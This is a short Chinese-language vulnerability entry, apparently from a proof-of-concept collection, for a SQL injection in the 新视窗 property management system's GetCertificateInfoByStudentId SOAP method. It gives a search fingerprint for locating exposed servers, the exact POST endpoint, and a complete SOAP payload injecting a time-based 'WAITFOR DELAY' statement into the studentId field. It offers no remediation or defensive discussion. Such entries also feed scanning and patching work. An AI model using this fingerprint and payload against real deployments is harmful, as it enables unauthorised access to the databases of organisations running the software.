# 新视窗新一代物业管理系统GetCertificateInfoByStudentIdSQL注入漏洞

新视窗新一代物业管理系统GetCertificateInfoByStudentId ｜ SQL注入 ｜ —
- **指纹**：`body="BPMSite/ClientSupport/OCXInstall.aspx"`
- **请求**：`POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
<studentId>1;WAITFOR DELAY '0:0:5'--</studentId>
</GetCertificateInfoByStudentId>
</soap:Body>
</soap:Envelope>
```